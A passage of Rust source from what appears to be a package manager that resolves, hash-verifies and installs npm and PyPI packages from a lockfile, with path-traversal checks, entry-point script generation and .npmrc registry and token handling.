        if let Some(spec) = parse_pypi_requirement(&parsed.requirement) {
            match mode {
                RequirementsMode::Install => {
                    if !parsed.hashes.is_empty() {
                        discovered
                            .hashes
                            .entry(spec.constraint_key())
                            .or_default()
                            .extend(parsed.hashes);
                    }
                    discovered.specs.push(spec);
                }
                RequirementsMode::Constraint => {
                    if let Some(version) = spec.version.clone() {
                        discovered
                            .constraints
                            .insert(spec.constraint_key(), version);
                    }
                }
            }
        }
    }
    Ok(())
}

fn requirement_logical_lines(content: &str) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current = String::new();

    for raw_line in content.lines() {
        let mut line = strip_requirement_comment(raw_line).trim_end().to_owned();
        let continued = line.ends_with('\\');
        if continued {
            line.pop();
        }
        let line = line.trim();
        if !line.is_empty() {
            if !current.is_empty() {
                current.push(' ');
            }
            current.push_str(line);
        }
        if !continued && !current.trim().is_empty() {
            lines.push(std::mem::take(&mut current));
        }
    }

    if !current.trim().is_empty() {
        lines.push(current);
    }

    lines
}

fn strip_requirement_comment(line: &str) -> &str {
    let trimmed = line.trim_start();
    if trimmed.starts_with('#') {
        return "";
    }

    let mut quote = None;
    let mut previous_was_whitespace = false;
    for (index, ch) in line.char_indices() {
        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        } else if ch == '#' && quote.is_none() && previous_was_whitespace {
            return &line[..index];
        }
        previous_was_whitespace = ch.is_whitespace();
    }
    line
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct ParsedRequirementLine {
    requirement: String,
    hashes: BTreeSet<String>,
}

fn parse_requirement_line(line: &str) -> ParsedRequirementLine {
    let (requirement, options) = match first_pip_option_start(line) {
        Some(index) => (line[..index].trim(), line[index..].trim()),
        None => (line.trim(), ""),
    };
    let mut parsed = ParsedRequirementLine {
        requirement: requirement.to_owned(),
        hashes: BTreeSet::new(),
    };

    let tokens = shell_like_tokens(options);
    let mut index = 0;
    while index < tokens.len() {
        let token = &tokens[index];
        let hash = if let Some(hash) = token.strip_prefix("--hash=") {
            Some(hash)
        } else if token == "--hash" {
            index += 1;
            tokens.get(index).map(String::as_str)
        } else {
            None
        };

        if let Some(hash) = hash.and_then(normalize_sha256_hash) {
            parsed.hashes.insert(hash);
        }
        index += 1;
    }

    parsed
}

fn first_pip_option_start(line: &str) -> Option<usize> {
    let mut quote = None;
    let mut index = 0;

    while index < line.len() {
        let ch = line[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && ch.is_whitespace() {
            let rest = line[index..].trim_start();
            if rest.starts_with('-') {
                return Some(index);
            }
        }

        index += ch_len;
    }

    None
}

fn shell_like_tokens(value: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote = None;

    for ch in value.chars() {
        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            } else {
                current.push(ch);
            }
            continue;
        }

        if quote.is_none() && ch.is_whitespace() {
            if !current.is_empty() {
                tokens.push(std::mem::take(&mut current));
            }
        } else {
            current.push(ch);
        }
    }

    if !current.is_empty() {
        tokens.push(current);
    }

    tokens
}

fn normalize_sha256_hash(value: &str) -> Option<String> {
    let hash = value.strip_prefix("sha256:")?.to_ascii_lowercase();
    (hash.len() == 64 && hash.chars().all(|ch| ch.is_ascii_hexdigit())).then_some(hash)
}

pub fn install_locked_packages(project_dir: impl AsRef<Path>) -> Result<InstallReport> {
    let project_dir = project_dir.as_ref();
    let lock = read_lockfile(project_dir.join(LOCKFILE))?;
    install_lock(project_dir, &lock)
}

fn install_lock(project_dir: &Path, lock: &OmcLock) -> Result<InstallReport> {
    let node_modules = project_dir.join("node_modules");
    let npm_bin_dir = node_modules.join(".bin");
    let python_site_packages = project_dir
        .join(".omc")
        .join("python")
        .join("site-packages");
    let python_bin_dir = project_dir.join(".omc").join("python").join("bin");

    remove_path_if_exists(&node_modules)?;
    remove_path_if_exists(&python_site_packages)?;
    remove_path_if_exists(&python_bin_dir)?;

    fs::create_dir_all(&node_modules)?;
    fs::create_dir_all(&npm_bin_dir)?;
    fs::create_dir_all(&python_site_packages)?;
    fs::create_dir_all(&python_bin_dir)?;

    let mut report = InstallReport {
        npm_packages: 0,
        pypi_packages: 0,
        npm_bins: 0,
        python_scripts: 0,
        node_modules,
        npm_bin_dir,
        python_site_packages,
        python_bin_dir,
    };

    for package in &lock.packages {
        if package.verdict != Verdict::Accepted {
            return Err(OmcRegistryError::BlockedLockedPackage(format!(
                "{}:{}@{}",
                package.ecosystem, package.name, package.version
            )));
        }

        match package.ecosystem {
            Ecosystem::Npm => {
                report.npm_bins += install_npm_package(
                    project_dir,
                    package,
                    &report.node_modules,
                    &report.npm_bin_dir,
                )?;
                report.npm_packages += 1;
            }
            Ecosystem::Pypi => {
                report.python_scripts += install_pypi_package(
                    project_dir,
                    package,
                    &report.python_site_packages,
                    &report.python_bin_dir,
                )?;
                report.pypi_packages += 1;
            }
        }
    }

    install_nested_npm_dependencies(project_dir, lock, &report.node_modules)?;

    Ok(report)
}

fn read_locked_archive(project_dir: &Path, package: &LockedPackage) -> Result<Vec<u8>> {
    let archive_path = project_dir.join(&package.archive);
    let bytes = fs::read(&archive_path)?;
    let actual = sha256_hex(&bytes);
    if !package.sha256.eq_ignore_ascii_case(&actual) {
        return Err(OmcRegistryError::DigestMismatch {
            name: package.name.clone(),
            expected: format!("sha256:{}", package.sha256),
            actual: format!("sha256:{actual}"),
        });
    }
    Ok(bytes)
}

fn install_npm_package(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let target = install_npm_package_to(project_dir, package, node_modules)?;
    install_npm_bins(&target, &package.name, bin_dir)
}

fn install_npm_package_to(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
) -> Result<PathBuf> {
    let bytes = read_locked_archive(project_dir, package)?;
    let target = npm_install_target(node_modules, &package.name);
    if target.exists() {
        fs::remove_dir_all(&target)?;
    }
    fs::create_dir_all(&target)?;

    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        let raw_path = entry.path()?.to_string_lossy().into_owned();
        let stripped = strip_first_path_component(Path::new(&raw_path))
            .ok_or_else(|| OmcRegistryError::UnsafeArchivePath(raw_path.clone()))?;
        let output = checked_join(&target, &stripped)?;

        if entry.header().entry_type().is_dir() {
            fs::create_dir_all(output)?;
        } else if entry.header().entry_type().is_file() {
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            entry.unpack(output)?;
        }
    }

    Ok(target)
}

fn install_nested_npm_dependencies(
    project_dir: &Path,
    lock: &OmcLock,
    node_modules: &Path,
) -> Result<()> {
    for package in lock
        .packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm)
    {
        let parent = npm_install_target(node_modules, &package.name);
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &parent,
            package,
            &mut Vec::new(),
        )?;
    }

    Ok(())
}

fn install_nested_npm_dependencies_for_package(
    project_dir: &Path,
    lock: &OmcLock,
    installed_dir: &Path,
    package: &LockedPackage,
    stack: &mut Vec<String>,
) -> Result<()> {
    let key = format!("{}@{}", package.name, package.version);
    if stack.contains(&key) {
        return Ok(());
    }
    stack.push(key);

    let nested_node_modules = installed_dir.join("node_modules");
    for dependency in package
        .dependencies
        .iter()
        .chain(package.optional_dependencies.iter())
    {
        let Ok(spec) = PackageSpec::parse(dependency) else {
            continue;
        };
        if spec.ecosystem != Ecosystem::Npm {
            continue;
        }
        let Some(locked_dependency) = find_locked_npm_dependency(lock, &spec) else {
            continue;
        };
        let dependency_dir =
            install_npm_package_to(project_dir, locked_dependency, &nested_node_modules)?;
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &dependency_dir,
            locked_dependency,
            stack,
        )?;
    }

    stack.pop();
    Ok(())
}

fn find_locked_npm_dependency<'a>(
    lock: &'a OmcLock,
    spec: &PackageSpec,
) -> Option<&'a LockedPackage> {
    let (_, requirement) = npm_registry_name_and_requirement(spec).ok()?;
    lock.packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm && package.name == spec.name)
        .filter(|package| {
            requirement
                .as_deref()
                .map(|requirement| npm_version_satisfies(&package.version, requirement))
                .unwrap_or(true)
        })
        .max_by(|left, right| compare_npm_versions(&left.version, &right.version))
}

fn install_pypi_package(
    project_dir: &Path,
    package: &LockedPackage,
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let archive_path = project_dir.join(&package.archive);
    if archive_path.extension().and_then(|ext| ext.to_str()) != Some("whl") {
        return Err(OmcRegistryError::UnsupportedInstallArtifact(
            archive_path.display().to_string(),
        ));
    }

    let reader = Cursor::new(read_locked_archive(project_dir, package)?);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut entry_points = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        let output = checked_join(site_packages, Path::new(file.name()))?;

        if file.is_dir() {
            fs::create_dir_all(output)?;
        } else {
            let name = file.name().to_owned();
            let mut bytes = Vec::new();
            file.read_to_end(&mut bytes)?;
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(output, &bytes)?;

            if name.ends_with(".dist-info/entry_points.txt") {
                if let Ok(content) = String::from_utf8(bytes) {
                    entry_points.push(content);
                }
            }
        }
    }

    install_python_entry_points(&entry_points, bin_dir)
}

fn pypi_wheel_dependencies(
    bytes: &[u8],
    active_extras: &BTreeSet<String>,
) -> Result<Vec<PackageDependency>> {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut dependencies = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        if !file.name().ends_with(".dist-info/METADATA") {
            continue;
        }
        let mut metadata = String::new();
        file.read_to_string(&mut metadata)?;
        for line in folded_metadata_lines(&metadata) {
            let Some(requirement) = line.strip_prefix("Requires-Dist:") else {
                continue;
            };
            if let Some(spec) =
                parse_pypi_requirement_with_extras(requirement.trim(), active_extras)
            {
                dependencies.push(PackageDependency {
                    spec,
                    optional: false,
                });
            }
        }
        break;
    }
    Ok(dependencies)
}

fn folded_metadata_lines(metadata: &str) -> Vec<String> {
    let mut lines: Vec<String> = Vec::new();
    for line in metadata.lines() {
        if line.starts_with(' ') || line.starts_with('\t') {
            if let Some(previous) = lines.last_mut() {
                previous.push(' ');
                previous.push_str(line.trim());
            }
        } else {
            lines.push(line.to_owned());
        }
    }
    lines
}

fn npm_manifest_from_tgz(bytes: &[u8]) -> Result<NpmPackageManifest> {
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        if !entry.header().entry_type().is_file() {
            continue;
        }
        let path = entry.path()?.to_string_lossy().into_owned();
        if strip_first_path_component(Path::new(&path)).as_deref()
            != Some(Path::new("package.json"))
        {
            continue;
        }
        let mut content = String::new();
        entry.read_to_string(&mut content)?;
        return Ok(serde_json::from_str(&content)?);
    }
    Err(OmcRegistryError::UnsupportedSpec(
        "npm tarball did not contain package.json".to_owned(),
    ))
}

fn npm_manifest_runtime_dependencies(manifest: &NpmPackageManifest) -> Vec<PackageDependency> {
    npm_dependency_fields(
        manifest.dependencies.clone(),
        manifest.optional_dependencies.clone(),
        manifest.bundle_dependencies.as_ref(),
        manifest.bundled_dependencies.as_ref(),
        manifest.peer_dependencies.clone(),
        manifest.peer_dependencies_meta.clone(),
    )
}

fn npm_manifest_platform_compatible(manifest: &NpmPackageManifest) -> bool {
    npm_platform_fields(
        manifest.os.as_ref(),
        manifest.cpu.as_ref(),
        manifest.libc.as_ref(),
    )
}

fn npm_install_target(node_modules: &Path, name: &str) -> PathBuf {
    if let Some((scope, package)) = name.split_once('/') {
        node_modules.join(scope).join(package)
    } else {
        node_modules.join(name)
    }
}

fn install_npm_bins(package_dir: &Path, package_name: &str, bin_dir: &Path) -> Result<usize> {
    let package_json = package_dir.join("package.json");
    if !package_json.exists() {
        return Ok(0);
    }

    let package =
        serde_json::from_str::<NpmInstalledPackageJson>(&fs::read_to_string(package_json)?)?;
    let Some(bin) = package.bin else {
        return Ok(0);
    };

    fs::create_dir_all(bin_dir)?;
    let bins = match bin {
        NpmBinField::String(path) => vec![(
            npm_default_bin_name(package.name.as_deref().unwrap_or(package_name)),
            path,
        )],
        NpmBinField::Map(map) => map.into_iter().collect(),
    };

    let mut installed = 0;
    for (name, relative) in bins {
        if !is_safe_script_name(&name) {
            continue;
        }
        let source = checked_join(package_dir, Path::new(&relative))?;
        if !source.exists() {
            continue;
        }
        let target = bin_dir.join(&name);
        remove_path_if_exists(&target)?;
        create_command_link(&source, &target)?;
        installed += 1;
    }

    Ok(installed)
}

fn install_python_entry_points(entry_points: &[String], bin_dir: &Path) -> Result<usize> {
    fs::create_dir_all(bin_dir)?;
    let mut installed = 0;

    for content in entry_points {
        for entry in parse_console_scripts(content) {
            if !is_safe_script_name(&entry.name) {
                continue;
            }
            let target = bin_dir.join(&entry.name);
            remove_path_if_exists(&target)?;
            fs::write(&target, python_entry_point_script(&entry))?;
            make_executable(&target)?;
            installed += 1;
        }
    }

    Ok(installed)
}

fn parse_console_scripts(content: &str) -> Vec<PythonEntryPoint> {
    let mut in_console_scripts = false;
    let mut entries = Vec::new();

    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            in_console_scripts = line == "[console_scripts]";
            continue;
        }
        if !in_console_scripts {
            continue;
        }

        let Some((name, target)) = line.split_once('=') else {
            continue;
        };
        let target = target.trim();
        let target = target.split('[').next().unwrap_or(target).trim();
        let Some((module, function)) = target.split_once(':') else {
            continue;
        };
        entries.push(PythonEntryPoint {
            name: name.trim().to_owned(),
            module: module.trim().to_owned(),
            function: function.trim().to_owned(),
        });
    }

    entries
}

fn python_entry_point_script(entry: &PythonEntryPoint) -> String {
    format!(
        r#"#!/usr/bin/env python3
from pathlib import Path
import re
import sys

_site_packages = str(Path(__file__).resolve().parents[1] / "site-packages")
sys.path = [_site_packages] + [
    path for path in sys.path
    if path != _site_packages
    and "site-packages" not in path
    and "dist-packages" not in path
]

from {module} import {function}

if __name__ == "__main__":
    sys.argv[0] = re.sub(r"(-script\.pyw|\.exe)?$", "", sys.argv[0])
    sys.exit({function}())
"#,
        module = entry.module,
        function = entry.function
    )
}

fn npm_default_bin_name(package_name: &str) -> String {
    package_name
        .rsplit('/')
        .next()
        .unwrap_or(package_name)
        .to_owned()
}

fn is_safe_script_name(name: &str) -> bool {
    !name.is_empty()
        && !name.contains('/')
        && !name.contains('\\')
        && !name.contains(std::path::MAIN_SEPARATOR)
        && name != "."
        && name != ".."
}

fn remove_path_if_exists(path: &Path) -> Result<()> {
    match fs::symlink_metadata(path) {
        Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {
            fs::remove_dir_all(path)?;
        }
        Ok(_) => {
            fs::remove_file(path)?;
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return Err(error.into()),
    }
    Ok(())
}

#[cfg(unix)]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    std::os::unix::fs::symlink(source, target)?;
    Ok(())
}

#[cfg(not(unix))]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    fs::write(
        target,
        format!("@echo off\r\nnode \"{}\" %*\r\n", source.display()),
    )?;
    Ok(())
}

#[cfg(unix)]
fn make_executable(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    let mut permissions = fs::metadata(path)?.permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions)?;
    Ok(())
}

#[cfg(not(unix))]
fn make_executable(_path: &Path) -> Result<()> {
    Ok(())
}

fn strip_first_path_component(path: &Path) -> Option<PathBuf> {
    let mut components = path.components();
    components.next()?;
    let stripped = components.as_path();
    (!stripped.as_os_str().is_empty()).then(|| stripped.to_path_buf())
}

fn checked_join(base: &Path, relative: &Path) -> Result<PathBuf> {
    if relative.is_absolute()
        || relative
            .components()
            .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        return Err(OmcRegistryError::UnsafeArchivePath(
            relative.display().to_string(),
        ));
    }
    Ok(base.join(relative))
}

pub fn parse_capability_grant(value: &str) -> Result<Capability> {
    if value == "dynamic-eval" || value == "dynamic.eval" {
        return Ok(Capability::DynamicEval);
    }
    if value == "time.now" || value == "time" {
        return Ok(Capability::TimeNow);
    }
    if value == "random.bytes" || value == "random" {
        return Ok(Capability::RandomBytes);
    }

    let (kind, target) = value
        .split_once(':')
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(value.to_owned()))?;
    let target = target.to_owned();

    match kind {
        "env" | "env.read" | "env-read" => Ok(Capability::EnvRead(target)),
        "fs.read" | "fs-read" => Ok(Capability::FsRead(target)),
        "fs.write" | "fs-write" => Ok(Capability::FsWrite(target)),
        "http" | "network" => Ok(Capability::HttpHost(target)),
        "dns" => Ok(Capability::DnsHost(target)),
        "proc" | "proc.spawn" | "proc-spawn" => Ok(Capability::ProcSpawn(target)),
        _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
    }
}

#[derive(Debug, Clone)]
struct NpmConfig {
    registry: String,
    scoped_registries: BTreeMap<String, String>,
    auth_tokens: Vec<NpmAuthToken>,
}

#[derive(Debug, Clone)]
struct NpmAuthToken {
    scope: String,
    token: String,
}

impl Default for NpmConfig {
    fn default() -> Self {
        Self {
            registry: "https://registry.npmjs.org/".to_owned(),
            scoped_registries: BTreeMap::new(),
            auth_tokens: Vec::new(),
        }
    }
}

impl NpmConfig {
    fn registry_for(&self, package: &str) -> &str {
        let Some((scope, _)) = package.split_once('/') else {
            return &self.registry;
        };
        self.scoped_registries
            .get(scope)
            .map(String::as_str)
            .unwrap_or(&self.registry)
    }

    fn auth_token_for_url(&self, url: &str) -> Option<&str> {
        let url = reqwest::Url::parse(url).ok()?;
        let host = url.host_str()?;
        let target = format!("{host}{}", url.path());
        self.auth_tokens
            .iter()
            .filter(|token| target.starts_with(&token.scope))
            .max_by_key(|token| token.scope.len())
            .map(|token| token.token.as_str())
    }
}

fn read_npm_config(project_dir: &Path) -> Result<NpmConfig> {
    let mut config = NpmConfig::default();
    if let Some(home) = env::var_os("HOME") {
        read_npmrc_into(&PathBuf::from(home).join(".npmrc"), &mut config)?;
    }
    read_npmrc_into(&project_dir.join(".npmrc"), &mut config)?;
    Ok(config)
}

fn read_npmrc_into(path: &Path, config: &mut NpmConfig) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }
    parse_npmrc_content(&fs::read_to_string(path)?, config);
    Ok(())
}

fn parse_npmrc_content(content: &str, config: &mut NpmConfig) {
    for raw_line in content.lines() {
        let line = strip_npmrc_comment(raw_line).trim();
        if line.is_empty() {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim();
        let Some(value) = expand_npmrc_value(value.trim()) else {
            continue;
        };

        if key == "registry" {
            if let Some(registry) = normalize_npm_registry(&value) {
                config.registry = registry;
            }
        } else if key.starts_with('@') && key.ends_with(":registry") {
            if let Some(registry) = normalize_npm_registry(&value) {
                let scope = key.trim_end_matches(":registry").to_owned();
                config.scoped_registries.insert(scope, registry);
            }
        } else if key.starts_with("//") && key.ends_with(":_authToken") {
            let scope = key
                .trim_start_matches("//")
                .trim_end_matches(":_authToken")
                .trim_start_matches('/')
                .to_owned();
            if !scope.is_empty() && !value.is_empty() {
                config.auth_tokens.push(NpmAuthToken {
                    scope: ensure_trailing_slash(&scope),
                    token: value,
                });
            }
        }
    }
}

fn strip_npmrc_comment(line: &str) -> &str {
    let trimmed = line.trim_start();
    if trimmed.starts_with('#') || trimmed.starts_with(';') {
        return "";
    }
    for (index, ch) in line.char_indices() {
        let previous_was_whitespace = line[..index]
            .chars()
            .last()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if matches!(ch, '#' | ';') && previous_was_whitespace {
            return &line[..index];
        }
    }
    line
}

fn normalize_npm_registry(value: &str) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        None
    } else {
        Some(ensure_trailing_slash(value))
    }
}

fn ensure_trailing_slash(value: &str) -> String {
    if value.ends_with('/') {
        value.to_owned()
    } else {
        format!("{value}/")
    }
}

fn expand_npmrc_value(value: &str) -> Option<String> {
    let mut expanded = String::new();
    let mut rest = value.trim().trim_matches('"');
    while let Some(start) = rest.find("${") {
        expanded.push_str(&rest[..start]);
        let after_start = &rest[start + 2..];
        let end = after_start.find('}')?;
        let key = &after_start[..end];
        expanded.push_str(&env::var(key).ok()?);
        rest = &after_start[end + 1..];
    }
    expanded.push_str(rest);
    Some(expanded)
}

fn npm_registry_package_url(registry: &str, encoded: &str) -> String {
    format!("{}{}", ensure_trailing_slash(registry), encoded)
}

fn npm_registry_package_version_url(registry: &str, encoded: &str, version: &str) -> String {
    format!("{}{encoded}/{version}", ensure_trailing_slash(registry))
}

fn npm_get(client: &Client, url: &str, config: &NpmConfig) -> reqwest::blocking::RequestBuilder {
    let request = client.get(url);
    if let Some(token) = config.auth_token_for_url(url) {
        request.bearer_auth(token)
    } else {
        request
    }
}

fn resolve_package(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    match spec.ecosystem {
        Ecosystem::Npm => resolve_npm(client, spec, options),
        Ecosystem::Pypi => resolve_pypi(client, spec, options),
    }
}

fn resolve_npm(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    let (registry_name, version_requirement) = npm_registry_name_and_requirement(spec)?;
    let install_name = spec.name.clone();
    if let Some(resolved) =
        resolve_npm_lockfile_tarball(spec, &install_name, version_requirement.as_deref(), options)?
    {
        return Ok(resolved);
    }

    let npm_config = read_npm_config(&options.project_dir)?;
    let registry = npm_config.registry_for(&registry_name);
    let encoded = urlencoding::encode(&registry_name);
    let constrained_requirement =
        constrained_npm_requirement(spec, version_requirement.as_deref(), &options.constraints);
    let version = match constrained_requirement.as_deref() {
        Some(requirement) if is_exact_npm_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = npm_registry_package_url(registry, &encoded);
            let root = npm_get(client, &url, &npm_config)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            choose_npm_version(&registry_name, requirement, &root)?
        }
        None => {
            let url = npm_registry_package_url(registry, &encoded);
            let root = npm_get(client, &url, &npm_config)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            root.dist_tags.latest
        }
    };
    let url = npm_registry_package_version_url(registry, &encoded, &version);
    let response = npm_get(client, &url, &npm_config).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let version_doc = response.error_for_status()?.json::<NpmVersion>()?;
    let platform_compatible = npm_platform_compatible(&version_doc);
    let dependencies = npm_runtime_dependencies(&version_doc);
    let filename = version_doc
        .dist
        .tarball
        .rsplit('/')
        .next()
        .unwrap_or("package.tgz")
        .to_owned();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: install_name,
        version: version_doc.version,
        source_url: version_doc.dist.tarball,
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: None,
        expected_sha1: version_doc.dist.shasum,
        expected_integrity: version_doc.dist.integrity,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: version_doc.scripts.unwrap_or_default(),
        platform_compatible,
        dependencies,
    })
}

fn resolve_npm_lockfile_tarball(
    spec: &PackageSpec,
    install_name: &str,
    version_requirement: Option<&str>,
    options: &LinkOptions,
) -> Result<Option<ResolvedPackage>> {
    let key = spec.constraint_key();
    let Some(version) = options.constraints.get(&key) else {
        return Ok(None);
    };
    let Some(source_url) = options.npm_resolved.get(&key) else {
        return Ok(None);
    };
    if version_requirement
        .map(|requirement| npm_version_satisfies(version, requirement))
        .unwrap_or(true)
    {
        return Ok(Some(npm_direct_tarball_package(
            install_name,
            version,
            source_url,
        )?));
    }
    Ok(None)
}

fn npm_direct_tarball_package(
    install_name: &str,
    version: &str,
    source_url: &str,
) -> Result<ResolvedPackage> {
    let url = reqwest::Url::parse(source_url)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(source_url.to_owned()))?;
    if url.scheme() != "https" {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "locked npm tarball URL for `{install_name}` must use https"
        )));
    }
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .unwrap_or_else(|| format!("{install_name}-{version}.tgz"));

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: install_name.to_owned(),
        version: version.to_owned(),
        source_url: source_url.to_owned(),
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: true,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn npm_registry_name_and_requirement(spec: &PackageSpec) -> Result<(String, Option<String>)> {
    let Some(requirement) = spec.version.as_deref() else {
        return Ok((spec.name.clone(), None));
    };
    let Some(alias) = requirement.strip_prefix("npm:") else {
        return Ok((spec.name.clone(), Some(requirement.to_owned())));
    };
    let alias_spec = parse_npm_spec(requirement, alias)?;
    Ok((alias_spec.name, alias_spec.version))
}

fn npm_runtime_dependencies(version_doc: &NpmVersion) -> Vec<PackageDependency> {
    npm_dependency_fields(
        version_doc.dependencies.clone(),
        version_doc.optional_dependencies.clone(),
        version_doc.bundle_dependencies.as_ref(),
        version_doc.bundled_dependencies.as_ref(),
        version_doc.peer_dependencies.clone(),
        version_doc.peer_dependencies_meta.clone(),
    )
}

fn npm_dependency_fields(
    dependencies_field: Option<BTreeMap<String, String>>,
    optional_dependencies_field: Option<BTreeMap<String, String>>,
    bundle_dependencies: Option<&NpmStringList>,
    bundled_dependencies: Option<&NpmStringList>,
    peer_dependencies: Option<BTreeMap<String, String>>,
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
) -> Vec<PackageDependency> {
    let mut dependencies = Vec::new();
    let bundled = npm_bundled_dependency_names(
        dependencies_field.as_ref(),
        optional_dependencies_field.as_ref(),
        bundle_dependencies,
        bundled_dependencies,
    );

    dependencies.extend(
        dependencies_field
            .unwrap_or_default()
            .into_iter()
            .filter(|(name, _)| !bundled.contains(name))
            .map(|(name, requirement)| npm_dependency(name, requirement, false)),
    );
    dependencies.extend(
        optional_dependencies_field
            .unwrap_or_default()
            .into_iter()
            .filter(|(name, _)| !bundled.contains(name))
            .map(|(name, requirement)| npm_dependency(name, requirement, true)),
    );
    dependencies.extend(
        required_peer_dependencies(
            peer_dependencies.unwrap_or_default(),
            peer_dependencies_meta.unwrap_or_default(),
        )
        .into_iter()
        .filter(|(name, _)| !bundled.contains(name))
        .map(|(name, requirement)| npm_dependency(name, requirement, false)),
    );

    dependencies.sort_by(|left, right| {
        left.spec
            .name
            .cmp(&right.spec.name)
            .then_with(|| left.spec.version.cmp(&right.spec.version))
            .then_with(|| left.optional.cmp(&right.optional))
    });
    dependencies.dedup_by(|left, right| {
        left.spec.name == right.spec.name && left.spec.version == right.spec.version
    });
    dependencies
}

fn npm_bundled_dependency_names(
    dependencies: Option<&BTreeMap<String, String>>,
    optional_dependencies: Option<&BTreeMap<String, String>>,
    bundle_dependencies: Option<&NpmStringList>,
    bundled_dependencies: Option<&NpmStringList>,
) -> BTreeSet<String> {
    let field = bundle_dependencies.or(bundled_dependencies);

    match field.and_then(NpmStringList::bool_value) {
        Some(true) => dependencies
            .cloned()
            .unwrap_or_default()
            .into_keys()
            .chain(
                optional_dependencies
                    .cloned()
                    .unwrap_or_default()
                    .into_keys(),
            )
            .collect(),
        Some(false) => BTreeSet::new(),
        None => field
            .map(NpmStringList::values)
            .unwrap_or_default()
            .into_iter()
            .collect(),
    }
}

fn npm_dependency(name: String, requirement: String, optional: bool) -> PackageDependency {
    PackageDependency {
        spec: PackageSpec::new(Ecosystem::Npm, name, Some(requirement)),
        optional,
    }
}

fn npm_platform_compatible(version_doc: &NpmVersion) -> bool {
    npm_platform_fields(
        version_doc.os.as_ref(),
        version_doc.cpu.as_ref(),
        version_doc.libc.as_ref(),
    )
}

fn npm_platform_fields(
    os: Option<&NpmStringList>,
    cpu: Option<&NpmStringList>,
    libc: Option<&NpmStringList>,
) -> bool {
    npm_string_list_allows(os, Some(current_npm_os()))
        && npm_string_list_allows(cpu, Some(current_npm_cpu()))
        && npm_string_list_allows(libc, current_npm_libc())
}

fn npm_string_list_allows(list: Option<&NpmStringList>, current: Option<&str>) -> bool {
    let Some(list) = list else {
        return true;
    };
    let values = list.values();
    let Some(current) = current else {
        return values.iter().all(|value| value.strip_prefix('!').is_some());
    };

    if values
        .iter()
        .any(|value| value.strip_prefix('!') == Some(current))
    {
        return false;
    }

    let positive = values
        .iter()
        .filter(|value| !value.starts_with('!'))
        .collect::<Vec<_>>();
    positive.is_empty() || positive.iter().any(|value| value.as_str() == current)
}

fn current_npm_os() -> &'static str {
    match env::consts::OS {
        "macos" => "darwin",
        "windows" => "win32",
        other => other,
    }
}

fn current_npm_cpu() -> &'static str {
    match env::consts::ARCH {
        "x86_64" => "x64",
